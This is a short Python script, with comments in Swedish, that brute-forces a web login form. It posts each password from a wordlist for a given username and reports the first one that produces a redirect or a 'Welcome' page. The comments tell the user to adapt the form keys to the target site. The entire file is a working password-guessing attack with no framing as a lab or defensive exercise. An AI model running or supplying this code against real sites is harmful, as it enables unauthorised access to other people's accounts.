import requests

def brute_force_login(url: str, username: str, wordlist: list[str]) -> str | None:
    for password in wordlist:
        # Anpassa payload-nycklarna ('username', 'password') efter målsidans formulär
        payload = {'username': username, 'password': password}
        response = requests.post(url, data=payload)

        # Kontrollera om inloggningen lyckades (t.ex. via HTTP 302 redirect eller specifik text)
        if response.status_code == 302 or "Welcome" in response.text:
            return password

    return None
